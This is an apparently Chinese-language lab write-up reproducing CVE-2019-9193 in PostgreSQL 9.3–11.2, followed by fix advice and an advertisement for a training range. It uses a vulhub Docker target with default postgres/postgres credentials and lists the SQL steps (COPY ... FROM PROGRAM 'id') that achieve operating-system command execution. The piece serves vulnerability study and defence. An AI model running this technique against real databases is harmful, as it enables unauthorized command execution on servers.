## **0x00简介**

PostgreSQL( 读作 Post-Gres-Q-L)是一个功能非常强大的、源代码开放的客户/服务器关系型数据库管理系统（RDBMS）。采用类似MIT的许可协议，允许开发人员做任何事情，包括在开源或闭源产品中商用，其源代码是免费提供的。

PostgreSQL特点：

Ø 支持WINDOWS、Linux、Solaris、macOS 、BSD。

Ø 支持文本、图像、视频、声音等

Ø 支持ACID、关联完整性、数据库事务、Unicode多国语言。

Ø 支持临时表，与物化视图

Ø 支持SQL的许多功能，例如复杂的SQL查询，子查询，外键，触发器，视图，视图，多进程并发控制(MVCC)、异步复制。

##  **0x01漏洞概述**

PostgreSQL是一个功能强大对象关系数据库管理系统(ORDBMS)。由于9.3增加一个“COPY TO/FROM
PROGRAM”功能。这个功能就是允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令

##  **0x02影响版本**

9.3-11.2

##  **0x03环境搭建**

1\. 本次漏洞环境使用vulhub中的docker搭建，vulhub下载地址：

https://github.com/vulhub/vulhub

2.下载完成后使用xftp传入安装有docker和环docker-compose境的虚拟机中解压并启动环境

cd vulhub-master/postgres/CVE-2019-9193

docker-compose up -d

![](https://image.3001.net/images/20210120/1611121067_6007c1abc161f76b921eb.jpg!small)

3.使用docker ps查看是否启动成功

![](https://image.3001.net/images/20210120/1611121076_6007c1b4b94af84ddeebc.jpg!small)

4.启动成功后使用navicat连接数据库，数据库初始账号密码为postgres/

postgres

![](https://image.3001.net/images/20210120/1611121083_6007c1bbe4d5f7dba4960.jpg!small)

##  **0x04漏洞复现**

注：这个漏洞介于权限提升和任意代码执行之间，它需要一些前提权限，这些权限可以是通过正常的登录PostgreSQL也可以是通过SQL注入获得与PostgreSQL交互的途径。需要说明的是，上述两种情形下都需要用户是一个超级用户或者是“pg_read_server_files”组用户

1.执行删除你想用来保存命令输出但是可能存在的表，这一步可有可无

DROP TABLE IF EXISTS cmd_exec

![](https://image.3001.net/images/20210120/1611121091_6007c1c38e923798176dd.jpg!small)

2.创建用来保存命令输出的表

CREATE TABLE cmd_exec(cmd_output text);

![](https://image.3001.net/images/20210120/1611121098_6007c1ca2f7abf69cf6cc.jpg!small)

3.通过 “COPY FROM PROGRAM”执行系统命令

COPY cmd_exec FROM PROGRAM 'id'

![](https://image.3001.net/images/20210120/1611121107_6007c1d3188d3efbc8b98.jpg!small)

4.将结果显示出来

SELECT * FROM cmd_exec

![](https://image.3001.net/images/20210120/1611121113_6007c1d9e5b135bc391d4.jpg!small)

5.执行其他命令

![](https://image.3001.net/images/20210120/1611121120_6007c1e087a9f13397c60.jpg!small)

![](https://image.3001.net/images/20210120/1611121127_6007c1e7ac1adb3867ff6.jpg!small)

6.查看账号信息

![](https://image.3001.net/images/20210120/1611121137_6007c1f1724d0f57d917f.jpg!small)

##  **0x05修复建议**

1.建议升级至最新版本

2.控制数据库权限禁止普通用户执行命令

在这里，给大家介绍一下“东塔攻防世界靶场”

2020年12月，东塔攻防世界靶场正式对外提供注册，各位小伙伴可通过注册后进行体验。新注册用户可获得一定的积分，对于靶场使用获取正确的Key后，也可以获取一定的经验值，经验值根据排名会不定期给予一定的奖励。

并且，在操作过程中，针对出现的Bug和安全漏洞问题可以和塔塔子提出，审核通过后可以获得相应的奖励积分。

东塔攻防世界网站不定时推出可免费限时使用的靶场，具体可关注东塔网络安全学院推出的一系列活动或添加东塔客服了解详情。

东塔攻防世界靶场主要分为在线靶场和职业体系两大特色板块。且平台内的靶场会定期更新内容，尤其是最新漏洞复现的一些文章和靶场，会优先在靶场中提供环境让大家体验。

东塔攻防世界网站会不定期限时免费推出最新的一些复现的靶场，以供学习交流，给了大家充分体验和使用靶场的机会。

具体可关注东塔网络安全学院推出的一系列活动或添加东塔客服wx（dongtakefu）了解详情。

除了以上介绍的内容，还有更多宝藏区域，更强大的功能，等你来寻宝！

详戳下方“东塔攻防世界靶场”网址，Get一波新世界

https://labs.do-ta.com

